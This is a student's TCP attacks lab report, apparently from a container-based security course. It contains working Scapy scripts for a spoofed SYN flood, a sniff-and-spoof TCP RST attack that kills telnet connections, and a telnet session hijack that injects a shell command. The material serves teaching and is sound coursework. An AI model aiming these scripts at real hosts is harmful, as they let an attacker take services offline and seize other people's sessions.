# TCP Attacks Lab - Alex Baron

## Task 1.1: Launching the Attack Using Python

In the container the free port is the telnet port, that is 23. So the final program is the following.

```py
ip = IP(dst='10.9.0.5')
tcp = TCP(dport=23, flags='S')
pkt = ip/tcp
while True:
    pkt[IP].src = str(IPv4Address(getrandbits(32))) 
    pkt[TCP].sport = getrandbits(16) 
    pkt[TCP].seq = getrandbits(32) 
    send(pkt, verbose=0)
```

One instance of the program is enough with a small queue limit (80) and it reaches immediately 60 elements in the queue. We can run different instance of the program if we want to reach the limit faster or with the default maximum queue limit. After running *ip tcp_metrics flush* to remove the mitigation we can see that the telnet connection is unfeasible.

## Task 1.2: Launching the Attack Using C

The *C* program reaches very fast the maximum number of items in the container queue, when this value is set to the default state. Meanwhile with the python program I needed more than one instance of the program running to reach the saturation of the queue when it is in the default state.

In this situation, anyway, the telnet connection is infeasible or it takes several time to be accomplished.

## Task 1.3: Enable the SYN Cookie Countermeasure

In this case the queue fills up but we are able to establish a telnet connection without any problems.

## Task 2: TCP RST Attack on *telnet* Connection

The following code performs the task automatically, sniffing the first packet sent by the client to the server in a *telnet* connection (in my case 10.9.0.5 is the client and 10.9.0.6 is the server), gains the information and send back a spoofed reset packet that closes an opened telnet connection. The correct sequence and ack numbers are fundamental and setting the correct flag as well (“R” for the reset packet).

```py
pkt = sniff(iface="br-c4613239b044", count=1, lfilter=lambda x: x.haslayer(TCP) and x[IP].src == "10.9.0.5")
pkt = pkt[0]
ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
tcp = TCP(sport=pkt[TCP].sport, dport=pkt[IP].dport, flags="R", seq=pkt[TCP].seq+1, ack=pkt[TCP].ack+1)
p = ip/tcp
send(p, verbose=0, iface="br-c4613239b044")
```

## Task 3: TCP Session Hijacking

In this case the program is quite similar to the previous task. With the following code the *telnet* session between client and server will be hijacked and the command *touch random_file* will be executed in the server. It is also possible to notice that the session is hijacked for the fact that in the terminal it won’t be possible to write anything.

```py
pkt = sniff(iface="br-d5b6ec4e964d", count=1, lfilter=lambda x: x.haslayer(TCP) and x[IP].src == "10.9.0.5")
pkt = pkt[0]
ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
tcp = TCP(sport=pkt[TCP].sport, dport=pkt[IP].dport, flags="A", seq=pkt[TCP].seq+1, ack=pkt[TCP].ack+1)
data = "\r touch random_file \r"
p = ip/tcp/data
send(p, verbose=0, iface="br-d5b6ec4e964d")
```

After logging back into the container it is possibile to see that the file has actually been created.

![img1](img1.png)
